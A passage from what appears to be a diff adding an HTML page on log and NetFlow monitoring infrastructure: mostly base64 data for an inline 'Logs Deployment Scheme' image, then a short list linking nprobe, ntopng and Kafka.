ZaByxlxilbsdTsuafuUbv2POoM2loqIe66pDYmvPZr27HX7QQqh9aqWvrnt27Z7ZeTUsc85xzF49C+q6Jt0E453b4b15qUc8L6SWfX6HlgiLQNr3UkE9TK2KnifLIezWNJK54VZWzZu2hvMjpD5lTSOaw8vvRFrgT8iHa9Oyuq32+it8Qio6aOFv8EdT9p7ldbp/iinVVylVB5Taw/+9f8AZy+r+HbdHbGNk08pPK/70/0QGzYPX1HLJXyNpI+5aPeef7AplaMetVsDTBTh8o/2knvO/wCn3LLIoGo111/4nx5I3VaWursghAI0URQyQQ/KcEt9zeaug5KKt3vYbuN5+bf7R+1VflVBcrVMKO4UohkfsMeD7j9erfitgFVHE6eo/wAMIIK9wmoKZ9NWRxloHLGXGKVux1Oy5p+5edb1f7NSnet8cpey8efbP1wbdB0da29xre14b934fvj6ZKrtsb31UcThzOB7u69j1UmgiLQNr1X7HnUGbS0VEPddUhsTXns17djr9oIXfhVlbNm7aG8yOkPmVNI5rDy+9EWuBPyIdr07J0T4ko0WnjRasy3uGeM4WEs+Pd8fXLJXWfh6etulqKWorYp455by3jwXC5+mEcKSCeplbFTxPlkPZrGklS+zYPX1HLJXyNpI+5aPeef7Ap9b7fRW+IRUdNHC3+COp+09yvUrzU9Zss4qWF+5z1HTYw5m8mJtGPWq2Bpgpw+Uf7ST3nf9PuWWRFUTnKbzJ5ZYRiorCQIBGioflOCW+5vNXQclFW73sN3G8/Nv9o/apgi9U32Uy3QeDzZVC1Ymsmv+VUFytUwo7hSiGR+wx4PuP16t+Kiltje+qjicOZwPd3XseqtTidPUf4YQQV7hNQUz6asjjLQOWMuMUrdjqdlzT9yjd+x51Bm0tFRD3XVIbE157Ne3Y6/aCFUPrVS19c9u3bPbLyaljnnOOYvHoX1XRNugnHO7fDevNSjnhfSSz6/Q8sERaBte6kgnqZWxU8T5ZD2axpJXPCrK2bN20N5kdIfMqaRzWHl96ItcCfkQ7Xp2V1W+30VviEVHTRwt/gjqftPcrrdP8UU6quUqoPKbWH/3r/s5fV/DtujtjGyaeUnlf96f6IDZsHr6jlkr5G0kfctHvPP9gUytGPWq2Bpgpw+Uf7ST3nf9PuWWRQNRrrr/AMT48kbqtLXV2QREUMkBERAEREBXXGCh8ypttU1u/OjnpDruXFvPGP8AxtWHyuYvNrvjHEmWihncT+tJE4dP2lTfiXTmXGHVLBuSjniqGfLTgCfwJURkgbPiVDGwg+yVstIzf1ZAQ0n8drhOtwcNVdFfmipL6NL+NzOy6XqE9NS3+VuP68/zhHG+gW7iP7e3XlyzUtbzNPZjgYnD73aVrKp7801VgsFwa13MaN9K4ju6SPqzf8ZhKs+01AqrZS1IcHeZE1xI9TrqrToN6lfdBdpYmv8AJZ/tFb1mLdNMn3jmL/x4/pnpREXTnPhERAFXXGCh8ypttU1u/OjnpDruXFvPGP8AxtViqM8S6cy4w6pYNyUc8VQz5acAT+BKq+tVfM0Ni8ln9Of6LPo9zp1tcl4vH68f2QjK5i82u+McSZaKGdxP60kTh0/aV330C3cR/b268uWalreZp7McDE4fe7S5SQNnxKhjYQfZK2WkZv6sgIaT+O1135pqrBYLg1ruY0b6VxHd0kfVm/4zCVxNlzSnNd8Qmvfs/wD1L9jqq5JOMPD70H7d1+0f3LYRea01AqrZS1IcHeZE1xI9TrqvSvpEJqcVJdmcJKLjJxfgERF6PIREQFdcYKHzKm21TW786OekOu5cW88Y/wDG1YfK5i82u+McSZaKGdxP60kTh0/aVN+JdOZcYdUsG5KOeKoZ8tOAJ/AlRGSBs+JUMbCD7JWy0jN/VkBDSfx2uE63Bw1V0V+aKkvo0v43M7LpeoT01Lf5W4/rz/OEcb6BbuI/t7deXLNS1vM09mOBicPvdpWsqnvzTVWCwXBrXcxo30riO7pI+rN/xmEqz7TUCqtlLUhwd5kTXEj1OuqtOg3qV90F2lia/wAln+0VvWYt00yfeOYv/Hj+melERdOc+EREAREQBERAeS9UwrbRWUh7TQvZ+IVd2dr6jHLtTgDzDBFVN/glnQ/f7qs89RpRK2WqjorzLDJcYHPnEsfkN+kWuOwD8NDa5fr2jlbqKpx7NSi+UvxLC7+7Ljp2pVdU4vzTX05f8IwMbRLi9S1gc00dxbPC36kcoBH7HOKl2Byc2NwxbB8hzoR8w0kA/gsZZG2MOr7bEaioeYA2cSDlDhGNAD56X7Zr0JrTcnWm3NgmgAe2P6XNvuft0Cqjpeoq0d9dtlibcJRxHLb2tvjHGVFJYz7EvWbr65QjF/iTy+O/Hv3yS9fjnNaNucGj5lQL2jNLjrkjlgaenRgZ/T1XTNj1wfs3a9QRevLJMXH8FNs+LLZx3abSTa85Ygv1ZDj0uEXiy1L0XLLDa5rmhzSCD2IX6sdjYp2WiGGmqRUsiHJzga2siuq0t3z6YW+aT4eV+q4fuVdkNk3HyC8l6phW2ispD2mhez8QvWh6jS22QVkHB9nwYhJwkpLwKws7X1GOXanAHmGCKqb/AASzofv91dkbRLi9S1gc00dxbPC36kcoBH7HOKz1stVHRXmWGS4wOfOJY/Ib9ItcdgH4aG1wsjbGHV9tiNRUPMAbOJByhwjGgB89L5xVo7EoQslGLalB5aznmS4WXnLXHp7HU2ayLcpRTaypdvZP9l+/uZPA5ObG4Ytg+Q50I+YaSAfwWdUQs16E1puTrTbmwTQAPbH9Lm33P26BXg9ozS465I5YGnp0YGf09Vc6f4ko0ukphXCVrceNkW08Nx8ceRWW6Cd105Sahz4vz5/snrnNaNucGj5lGua5oc0gg9iFXk2PXB+zdr1BF68skxcfwUzxsU7LRDDTVIqWRDk5wNbU/pXW79bqHVbT8tYysyW5/wCPdEbVaOumClCe72Tx+pkURF0RAPJeqYVtorKQ9poXs/EKu7O19Rjl2pwB5hgiqm/wSzofv91Weeo0olbLVR0V5lhkuMDnziWPyG/SLXHYB+Ghtcv17Ryt1FU49mpRfKX4lhd/dlx07UquqcX5pr6cv+EYGNolxepawOaaO4tnhb9SOUAj9jnFS7A5ObG4Ytg+Q50I+YaSAfwWMsjbGHV9tiNRUPMAbOJByhwjGgB89L9s16E1puTrTbmwTQAPbH9Lm33P26BVR0vUVaO+u2yxNuEo4jlt7W3xjjKiksZ9iXrN19coRi/xJ5fHfj375JevxzmtG3ODR8yoF7Rmlx1yRywNPTowM/p6rpmx64P2bteoIvXlkmLj+Cm2fFls47tNpJtecsQX6shx6XCLxZal6Lllhtc1zQ5pBB7EL9WOxsU7LRDDTVIqWRDk5wNbWRXVaW759MLfNJ8PK/VcP3KuyGybj5BERSDwEREAUXu9NaaPJYrjU1E0dQ8gtYxvTfbZKlC8Vfa6KumZLVQ+Y5g03qVU9Z0VmroSpjFzjJNbs4TXjxznHYk6W5VTbk3hrDwYMTWuiys08VtPtEz/AH5y8ke+NnQ+HVei1Vde+8VFE6kjp6drXBroote96Hfb4rO+RD5vm+UzzNa5tdVisgvMlsvOO0DIGyNu9wfSPcXaMYbSzz8w+PWED+N8lCo6LqK7N3zVGKm5JRil91/leO/q+5tnq4yjjbl4xlvPPmYI2nJq7YqaqRrT6Ol0PwC76bDOoNTW9fUMb/aVL0UOHwT0xy36jda/OUm/4wbH1S/GIYivRHis9tgtdMYIHSOaXcx5zvqvaiLqdPp6tNVGqqOIrsivnOU5OUnlsIiLceSL3emtNHksVxqaiaOoeQWsY3pvtslfgmtdFlZp4rafaJn+/OXkj3xs6Hw6rOV9roq6ZktVD5jmDTepXp8iHzfN8pnma1za6rlZdE1LvnKvZBfMU09u59vvZz2b4w14Fj9sjsSll8Y74Xp28PcwVqq6994qKJ1JHT07WuDXRRa970O+3xWKNpyau2Kmqka0+jpdD8As3gt5nyDFKG8VEUcUtS1xcyPfKNPc3pv7Fm16u+GI6quNepvnJJyfD25TxhPHljj3Z5jr3XJyhBLt6/8AZIhTYZ1Bqa3r6hjf7SpFZ7bBa6YwQOkc0u5jznfVe1FM6b8N9N6bP5mmrxLzy2/3Zqv1t96xOXAREV4RQovd6a00eSxXGpqJo6h5Baxjem+2yVKF4q+10VdMyWqh8xzBpvUqp6zorNXQlTGLnGSa3ZwmvHjnOOxJ0tyqm3JvDWHgwYmtdFlZp4rafaJn+/OXkj3xs6Hw6r0Wqrr33ioonUkdPTta4NdFFr3vQ77fFZ3yIfN83ymeZrXNrqsRgt5nyDFKG8VEUcUtS1xcyPfKNPc3pv7FCo6LqK7N3zVGKm5JRil91/leO/q+5tnq4yjjbl4xlvPPmYQ2nJq7YqaqRrT6Ol0PwC76bDOoNTW9fUMb/aVL0UOHwT0xy36jda/OUm/4wbH1S/GIYivRHis9tgtdMYIHSOaXcx5zvqvaiLqdPp6tNVGqqOIrsivnOU5OUnlsIiLceQiIgCIiAKI51/nbgP8Ax2b/ANMrVLlEc6/ztwH/AI7N/wCmVqAlyIiAIiIAiIgCIiAiPBz/AEa2f/ck/rHqXKI8HP8ARrZ/9yT+sepcgCIiAIiIAiIgCiPBz/RrZ/8Ack/rHqXKI8HP9Gtn/wByT+segJciIgCIiAIiIAiIgCIiAKI51/nbgP8Ax2b/ANMrVLlCOJ9woLVfcGuF0rqaho4b7L5tRUytjjZu3VjRtziANkgdfUhATdFGPzicP/39Yx/O0H95PzicP/39Yx/O0H95ASdFGPzicP8A9/WMfztB/eT84nD/APf1jH87Qf3kBJ0UY/OJw/8A39Yx/O0H95PzicP/AN/WMfztB/eQEnRRj84nD/8Af1jH87Qf3k/OJw//AH9Yx/O0H95AdHBz/RrZ/wDck/rHqXKruEmfYLT8O7TDPmmNxStY/mY+6QtcP0ju4LlKvzicP/39Yx/O0H95ASdFGPzicP8A9/WMfztB/eT84nD/APf1jH87Qf3kBJ0UY/OJw/8A39Yx/O0H95PzicP/AN/WMfztB/eQEnRRj84nD/8Af1jH87Qf3k/OJw//AH9Yx/O0H95ASdRHg5/o1s/+5J/WPXf+cTh/+/rGP52g/vLzcFpI5uGFkmhkbJG+J7mPadhwMjiCD6hATBERAEREAREQBERAEREAXGWOOVvLLGx43vThsLkiA6PY6T9ywfyYT2Ok/csH8mF3ogOj2Ok/csH8mE9jpP3LB/Jhd6IDo9jpP3LB/JhPY6T9ywfyYXeiA6PY6T9ywfyYT2Ok/csH8mF3ogKl8JlNTP8AD5izn08TnFlRslgJ/wDeZVafsdJ+5YP5MKsfCT/q84r017lT/wD2ZVaqA6PY6T9ywfyYT2Ok/csH8mF3ogOj2Ok/csH8mE9jpP3LB/Jhd6IDo9jpP3LB/JhPY6T9ywfyYXeiA6PY6T9ywfyYXc0BrQ1oAAGgB2C/UQBERAEREAREQBERAEREAREQBERAEREAREQBERAVX4Sv9XnFPnFOf/5EqtRVZ4S/9XfEfnTyn/78itNAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREARFxmdyQvf9VpKAq7wl/6u2H/ADpJD/8AekVpqrfCb08O+HD/APJv/rXq0kAREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBYTMsisOO2vzL7e7daxU80NMayqZCJpOUkMbzEbd8h1WbVf+IbAIuJXCa840ImurzH7TbXHQ5KqMEx9T0HN1YT9V7kBHfCPf7FU8GMax+mvVumu9JQukqaCOqY6ohYZnac+MHmaDzN6keo+IVxKjPBtwjruF+AVU2RUTaXJbvUF9ZH5jJDDFGS2KPmY5zT+s/YP6+j2V5oAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgMLmWV45htmdeMovFJaqFrgzzah+g5x2Q1o7uPQ9Bs9FhOH/Ffh5n1XJR4llNFcqqNpe6AB8cvKO7gx4BI+YC1w8XDLTcvFDgFnz+qkpsJNG10ji8sj53SSB4c4fRBLYWuPTTTvY7qP8AGS08O8V8QvDR/B6elhustfELhT2qfzYmMMsbWHYJAc9jpQ4A/RAJA3twG8iLxXq72qyUD7hernRW2kZ9OernbFG37XOIAXRjuR4/klKavHr5bLvTtOjLQ1TJ2g/AlhIQGUREQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQFUeJm2cKrlhHLxPqKClZGHut80kvl1DZOXtER7x302ACD02OgVHeAe2cJ/YYLpPVUEnEHzZmMhqZf0kUfoYWO6cxbvZbs632G1gIMfbx88Y+R2bMK+qFnsYn8qkZIWEwwSMiETfq8zncziOp66I6a9PjI4L4hwxxqz51gLKuxVTLjHSuhiqpHt5ix72ytc5xc1wMfoddR29QPdxmZScVvGdScN8rvD6TGrZEyOCGCcM86R1O2Zw2dgPc9wZ23pgA69V46jHbdwU8YeJWHh5dKn2G7shjuNA+bzeRsj3NLHfEaDXjfUHr20pPgXhjwDPuCeN3w1V4t+QXGnbX1FzNR5skj3jbmua73S3fUa074k9VY/A/wAN+KcNMifk0lyrMgvnKWw1VW0NEGxpzmNG/eIOuYk9O2tlAXciIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgNUOP3BXPLDxNm4wcHavkuD9z11H5jQ8P1qRzQ/3XscOpYeu9kb2AK6xvG+NnijbbbhlN3p6LEKSZ3LUNjYxheOj+SJp5nv1027QHXR6kG6fFRxOzWhy6y8JOGsEf8AhFf4PMkqXBpdFE4uaA3mHKNhjyXHegOnXqq14W3Xij4b84xrAM1ZQV2K5DVeVSmmeHiGV72te9j+Vrthz2czXDRB6fFAYSePjXLxJi8NVu4hiKmtgby3GCM07/ZhA2VrXOb75Aa4DlB6noSQFKsGu3ErgZx/sHDfKMrlyuw5EGeW+d73mLnc5jXM5ySwh7erdlpB+PUWD4h+COUX7OaPifwuvcNny2mjbFM155BUBoLQ/m0RzcumkOBBaB1GuuG4RcDOIlx4p0fE3jVkMVxudsAFBSQyNd7zeblL+RoY1rS4uDW93dT6ggbPIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIsRmeQ0GJ4rc8lugmNDbad9ROIW8z+Ro2dDY2fvQGXRR/h1l1pzvDLflljFQLfXte6EVDAyTTXuYdgE66tPqpAgNePE/wALM4uucWDirwxljdktkiELqV72tM0Yc5zeXmIafpvBaSNgqF4/gXHDjDxPxvJeLNvpsfsmN1AqIKdjGNdK8Oa4hrA5zveLGbc46AHQHqFt2sVl+RWjE8arsjv1W2kttDF5s8pG9DYAAA6kkkAAdyQEBlUVM2vxH4PXcO7rnptmRU1kt1ZHSF81IwPnc/oHRgPILd9Dsj7FamLXqjyPGbXkNuEoo7nRxVlP5jeV/lyMD28w66OiOiAySIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAq88S3+gLN/+DT/8pVhqvPEsCeAWbgf/AEef/lKA1r4Z8Xb/AEXBTAuFvCqJldnFc2Z08vI18dviNTKdvDgW8xGj16Bp36hWVx04oZ1w1x/FcEtFxhyTiLfiGuqn00bGx7cGgtiaA0beS1vNsaY4napLEcVvnD7hJgnH7BIi6qpI5oshoxsipg9pkbzkfDlDWu+Gmu9CVNfEJWTX6v4f+JPAqOa80NrjYy40zWkup2xyF+ngdW6L5GuPYe6e3VAe7LKjxUcMMOuOX3jKbRkVG2ncaqnZDG6Sic4aEzf0TQQxxBIG26HUa6iOcR8o4jcQvBOzLLlf6OSnbWOZe43UrGPqmCribAGcrNN5X6J1rY+KzPFjxQWrPOF15xjBcZvst2uFsmFcaiBnlUdMGEzvJa470zmAOgOu+/RYS1td/wCzau40d+2M6a//AFCFAdOVUOW0ngMZLkd2o66gqJKCSzxQRBjqan5h7jyGjmdvrvZ+1SfFOKuZ5PZeH3CvgzNFFX0NioDfbzJAyaGjAp2BzNOBGweh9ebTR6rjxYB/9nvjg0d+y2/p/HCjVlobtwAhwPi5j8M1TiWR2WgiyOijbssldAwl/X1JJe09Pe5m9nICz+OfFDiHb86sPBrhnVQ12V1NM2S4XWohj5o9gnfLry2e6C8+6ehaAN94ZxPyPxOcGsKnud9ya13+iq3shZXxU7HyW+UvDtkGMAtcA5nvAgFw1o63+8Z7jVYBx6sfiHsVumyHEbxQRtqZqftHuIRd/wBUloYRzdyHDosR4lPEJRcUOFdyx3BMevRt7fIqL3W1kDGNgiEzPLYOVzupl8sb6dum+pAG2HBy83HIuFeM327TCevr7bDPUSBgaHPc0EnQAA6+gUsUD8PHTgZhYP8A9Gp/+QKeIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAvxzWuaWuAcD3BC/UQHERxiPywxoZ25ddEbHG1hY2NrWnuAOi5IgPJR2y20ZkNJb6SnMv+UMULW8/26HVejyYvL8vymcn1eUa/Bc1j8m/zbuf/AHOX/kKA9pijMflmNhYP1SOi/THGY/LLGlnblI6LC8P3vkwPHpJHOe91rpi5zjskmJuySs4gOD4YXwmB8THREaLC0FpHw0uijt1vo4XQUlDS08TjtzIomtaT8SAF6kQH41oa0NaAAOwC/URAEREAREQBERAEREAREQBERAEREAREQBERAEREAREQBY/Jv827p/3OX/kKyCx2UENxm6EkACjmJJ9PcKA8fDv/AEf45/wql/qmrOrBcOiDw+xwjt+SqX+qas6gCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiALD5zL5GE32bevLttQ78I3FZhV5x6zTHcWwW6UF7uTKGpu1pr46AyscGSytgJ8vn1ytceYaBI311vSAl2GxeRiFmh1ry6CBv4RtCyqjnD3J8dyixmXGrpDc6WheKOWeAExeY1jSQ1+uV4AcOrSR6bUjQBERAEREAREQBERAEREAREQBERAEREAREQBERAEREARFXPH/irQcJ8QjvFTQS3CrqpvIo6ZruQOfrZLnaPK0D5E9R9oAsZcXvYwbe9rR8SdL5yZr4k+LGSzP5L/wDkWmcNCC2R+UB/HO37+9Vhdb/fbrM6e53m4VsrvpPnqXvJ/EoZwfU65ZrhtsfyXLLbDRO3rVRcYozv+M4KqPEXWcMOKHDGuxdvELEIbhzsqLfUTXSLkhmae5LSTotLmnQPRy+e5c493E/aV+IMH0t4XZDwjwjBrTidmz3FvZ7fAI+d10ga6V/d8h97u5xJ+9T615Fj91ANrvlsrgRsGmq2SdPj7pK+Si5MkkYQWSOaR6g6QYPr4CCNgghF8o8ezrM8elElkym8UBHpDVvDT9o3o/ero4a+LPPLFVQwZXHBkdv5tSOcwRVLR/Bc33Trvojr8Qgwb6IsdjF5osix23323Oe6jr6dlRCXt5XcrhsbHoeqyKGAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAo3xIwmwcQMVqMdyKl86ll95j29JIJADqRh9HDf9h2CpIqm8Q3FabhRLjFykohW2yuqpYK6JvSQMDWkPYfrDr0PQ79O4A0h46cIsi4V5CaW4MNXap3H2G4xsIZM36rvqvHq38Njqq4X1Qc3CeLWAa/xS+WG4x9D6g/0se0/YQVob4ieB984WXd1VAJbjjVQ//Fa4N6xk/wCzl12cPj2d6eoAzkqFERDIREAJIABJPYBAFst4XPDpUZc+my/N6eWmsAIkpaN22yV3wLvVsf7XenTqpF4W/DYag0uacRKIiEalobTK36fqHzD4eoZ6+vTob646cXsb4T475lVyVV2mYRQW2NwDnnsHO+qwfH7htDBZFLBBS00VNTRMhgiYGRxsbprGgaAA9AF2KM8Kr5WZNw4x/IbgIxV3GhjqJhG3TQ5w2QB8FJkMBERAEREAREQBERAEREAREQBERAEREAREQBa6ePPFLzkHDW23O00klW20VbpaqONu3NiczRfr4Agb+3fYFbFrhI6IuEMjmc0gOmOI24Dv09e4/FAfMzgVxeyLhVkAqaB7qu0zuHt1ukfpko+s36rx6O/HYX0ExHJMM4t4Gaqi9nulqrY/LqqSdoLo3EdY5G+jh/8A4QexWt3il8NnlGqzTh1Q/o+stdaIW/R9S+ED0+LPT0+A124TcRsl4ZZQy8WGoLWkhtXSSE+VUsB+i8fHvo9whkszxM+Hu48PambIsZZNX4vI4ucNF0tCSfov+sz4O+4+hNAr6g8JOJWJ8WcTdWWx0bnmPy7hbajTnwkjRa5v6zT10exHz2BVmd+ETCL3d5bhYbtXY+2Zxc+mYxs0LST+oDotHy2R8NIMmitLTz1VTHTU0Mk08rgyOONpc57j0AAHcrdnwu+G6HHhTZhn1Iye8dJKO3P05lJ8HyejpPgOzfme1hcF/D5hPDStF2p/aLveQ3TaysDT5O+/lsA00/Pqe/XRUc8TfiGocAgmxrFZIa7KHt5Xv6OioQR9J31n/BvYdz8CBn/EXx0svC21voKMw3HJ52f4vRc3uwg9pJddm/Bvc/IbI0Eu9yyjiFmTquskq71fLlMGta1pc97iejWtHYD0A6ALjbKHJ8/zBtNSsrL1fLlMSS5xe+Rx6lziewHck9AFv14cOBVn4XWxtxrxDcMnnj1PV8u204I6xxb7D4u7n5DogJ/wmstZjnDLG7FcA0VlDbYYZw07AeGjY366Kk64xvZIwPje17T2c07BXJDAREQBERAEREAREQBERAEREAREQBERAEREAWtnjpyG84rb8Lvtgr5aG4UtxmdFLGf4DdgjsQR0IPQhbJqsPElwsbxVwMWqCqbSXSilNTQyvHuF/KQWO9eVw9R2IB660QMV4cuOlm4o2ttvrvJt+TwR7qKTemTgd5It9SPi3uPn3UD8UnhwhyMVWZYHSsgvPWWtt7BplWe5eweknxHZ3yO96gXW35Rw9zJ1LVx1dlvtsmDgWuLXxuHUOa4dwe4I6EFbveGTxDW/P6eDGsplhocoY3lY/o2KuA9W/B/xb69x8AMmkmGZRk3D7LI7vZKqe23OkeWSMcCA4A+9HI09x06g/wBK3OwXxc4DcrRCcpp66y3IM/TtjgM0LnfFjh72j8COnbZ7rI+Jjw927iHBNkWNRwW/KWN2/wDVirgB9F/wf8H/AHH0I0Nv9mutgu1RabzQVFDXUz+SaCZha5h+z9vz2gNq+OPizhrrPLZeGkVXTyzgsmulTGGPjb/+E3Z0T9Y9vQb6jWrBMRyfiJlkdnsVLNX3CpeXyyvJLWAn3pJH+g69Sf2krKcIOF2UcTchbbLFSOZTMcPa66RpENM0+pPqfg0dT+JH0K4U8O8U4S4e6itgjjDY/NuFxqCGvmLQSXvd6NHXQ7AfeUBi+A3B3HeFFh1TiOsvU8f+O3KRoDnepYz6rAR29dbO1R/ij8Sn/vOG8Oa/4x114hd+LISP2vH3fFRzxR+I6fJzVYdgtTJT2TZjrK9hLX1g7Frfqx/H1d8h0NU8DOEeRcVch9ktzTSWuBwNdcXs2yEfAfWefRv46CA3/wDD8S7glhznEkm0QEk/7oU5WNxay0eOY3brBbw4UlvpmU0PMdu5WNABJ+PRZJDAREQBERAEREAREQBERAEREAREQBERAEREAREQFZ8euDuP8VbD5VW1tHeadh9iuDG+8w/Uf9ZhPp6dxpfPLO8SyXh3lsllvlNLQXClcJIpGEgPbv3ZI3DuDroR6jXcFfVlQjjFwyxvifjLrRfYOSePbqStjaPNpn/Fp9QfVvY/bogZKQ8L3iSivgpcO4gVbIrp0jornIQ1tT8GSHsJPg7s77e+yd7x7H76Gflqx2y5hn0Pa6Rk3L9nMCvmTxe4aZLwxyZ1ov1PuJ5LqSsjB8qpYD9Jp9D8WnqPwUywHxMcUcRtUdrZcKS8UkTAyFtyhMjomjsA8EOP8YlAfQGvqsfxDHZ62pdQ2a00UZfI4NbFFG0fIaHy0Foh4l/EFc+I1TLj+PST2/Fo3aLd8slaQejpPg31DPvOzrUE4qcX874kvbHkt25qKN/PFQ07BFAw/HlHVx+biT81PPDP4fbjxFqYshyJs1Bi0b+h1yyVpHdrPg30L/uHXZAGD8O3A+98U7s2rnEtvxqnkAqq4jRk+McW+7vn2b6+gP0Iw7GbJiGPU1hx6gioaCmbpkbB3Pq5x7ucfUnqV67HardY7TTWm0UcNFQ0sYjhgibytY0egC9qGAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiICOcRcKx7PsZnx/JKFtTSyjbHDpJC/0ex36rh/0Ox0WlOe+E3iNaLtI3GGUuQW5zj5UjahkMrW76B7XkDf8Aukj7FvyiA084HeE2tiusF54mmm9niPOy0wS85kd6ea9vTl+TSd+p7hbf0sEFLTRU1NDHDBEwMjjjaGtY0DQAA7ABdiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAq1yPjPi+P8AGC2cMbrQXmC6XMRmlqzDF7I/nB5fe8zm+k0t+h3+XVWUtW/+0Bxupix/GuJVpHJX49XtjklHdrHuDo3fxZGj/wAaAuTjZxbxjhJabfcMkp7lVflCoMFPBb4mSSuIbsu097RyjoO/cjovBUcTMobxYs+IU/C6/SWS4U8c0t/dziGkL43PLJA2JzOZpAaf0nc/jrxdr/TeIXxQYJQ0JE9hs1uhuNYwdWtfytmlaf43lRn5gqeZxk2SU/jtxTHKfILtDZJ7c181uZWSNppHeVUHbogeUnbW9SPQfBAbNKOcQ85xbh9Ym3zL7p+Tbe6ZsDZvZ5ZtvcCQOWNrj2B660tbcZvmacduPuW47JnWQ4li+NvkjiprDU+yzylshiBdIASSS0uPNsDoAB3WD8X2B5JjHBKB2Q59fcjjpL/5du9pqd89NJHse0Dl/SSscx4a/fZ57b0ANybZW01yttNcaKXzaWqhZNC/lLeZjgHNOjojYI6Fehat5bW3fgZ4aWZTYMtyi9XS901BBTfluuFXDbS+MuJgYWgMAGwAdjoze9dYlnEHEXh9wMxnjFQcWsur71WOpp62hr63z6BzZ2lwayFw0NdB6+pHL6AboqG8YsvveEYf+W8fwy45hW+0sh/J1CXiTldvb/cjedDQ/V9e61z49cQcqu2S8EK+xZFeMciyWKGargoat7GEySQfSZvlkA5iAHgjXcdSpP4m7VfuGfAi+XSzcRs4rrjW3Sleautuv6SAcxDmQmJrBGw76tA10CA2Bw261l8xS1Xi4Wiez1dbSxzzUE+/MpnuaCY3ba07B6dQPsCyy1n4iZTZ6fg1w1myvihl2PVVZa4Znw2GR7rldXuhj/2nUjTjvbu5d32oJwj4g5bZfExY8Qpr1xGqcbvMZD6POGf44P0chD2Eknl2wacOXfUEdNoDYuzcZcYuvGe4cKKegvDb3QMc+WeSGMUxDWNeeVwkLuzh3aPVWQtP+Hv/AMRTKv8Au839RCru8U2fXXhvwcuWQ2MMFzfLHS00j2B7YXSHXOQeh0Adb6b1vfZAWki0tyyn4i4Z4f7BxpouLmX1l9qjTVNVRVlb5tA5k56MbA4aGtt+I76A9MhxW4t5tnWQ8LsHxq8VOJtyy30lbcKuicWTB0ziC1jx7wa3kcehG9gEoDcJFqFfm5TgXiz4fYVTcSM2vNnqoY5ZorrdnS+Zt0wLXhoa1490fSBPpvQGoxxV4iZVbuNV/oeK+Q8S8Wx+KZ8dkbikraWN8fN7j3OdoStLepI5jskdNaAG8iKsfDPeY73wwiqoc3nzOFlXNHFcamJ0dQGAgtjma4b52g6J676EHRVnIAiIgCIiAIiIAiIgCIiAKPcSMVo83wS84nXv8qC50roPN5OYxOPVrwNjZa4A62OykKICkvDV4f6Pg3X3e4uyL8vVtwjjhZKaH2byI2klzQPMfvmPL6j6IWVyDg3+VvERZuLn+Efk/kylFP8Ak32Lm8zTJG783zBr/Kb1yHt81bCICkcl4Bzx8SaziBw3zyuwe9XEO9vDKCOtp5y7RcfKeQASRzHexvqAF23rgKzIuFF1w3Ks2ul6ulyuQukl5lgY1zKgNa1vLFvQjDW65ObsTojpq6UQFO2fgtcq3hncOH3EbPKjMLPLBBDby22RUUtvEQPK5r2ucXu+j1eT9HXXZUUf4Z7zdLJacRyni5drvhdqlD6W0R2uKnkAbsNa6cOLnAAkdQdDtrotjUQFPcUuBtJmWWYJeaC+MsdJh72eRQsofNbKxj43NYHeY3kAEYHZ3dSLj7w4/Orw7mxH8s/kfzamKf2n2Xz9ch3rk529/jtT9EBRefeHiHJLPgzrdmFRZshw6lgpqS5soWzMlEXKQ4wueNHmbse8R1IPMuu18Ab7+eTH+J2ScT6rILnaowyaOazxQibTZGgM8t4bE33965XHYPXr0vhEBrfn3hlvV/4sXjiFYOLFwxetuTwQKGgeJYm8jWFvmsqGEg8u+wWfxTgHcBimSYxxG4l37PLdeoomRisMrX0T43OcJIzJNKA7Zaew+iN7HRXiiA1xf4Zr1cMftuGZDxeu9ywi3TCSntDLXFDKAN8rTUcxLgNnW2kD0A0NY7xXYvw1stXg1XXZDdMEr7ZGYLRd6G3Oq6enjgLC2ORjSH7BO2kfwt7Wz6IDSHhtTXjiV4qcbyi25LeM2tVipwa/Iqm1Cgp+ZokIjjjDQGjb2jlO3E857Dau6+cFs9lfe6Cw8bLpbcevM08k9sqrNDW+W2Ykvjjke4FjfeOg0DX2q8EQEK4McNrFwswqPGLFJUzx+a6eeoqCDJNK4AFx0AANAAAdgB3OypqiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiIAiIgCIiAIiID/9k=" alt="Logs Deployment Scheme" style="max-width:220px; border:1px solid #dee2e6; border-radius:6px; padding:8px; background:#fff;"></div>
+      <h3>NetFlow</h3>
+      <ul>
+        <li><a href="https://www.ntop.org/products/netflow-probes/nprobe/" target="_blank">nprobe</a> - NetFlow probe on the firewall</li>
+        <li><a href="https://www.ntop.org/products/traffic-analysis/ntopng/" target="_blank">ntopng</a> - NetFlow web interface</li>
+        <li><a href="https://kafka.apache.org/" target="_blank">Kafka</a> - optional queuing of NetFlow packets from nprobe</li>
+      </ul>
+<div style="text-align:center; margin: 16px 0;"><img 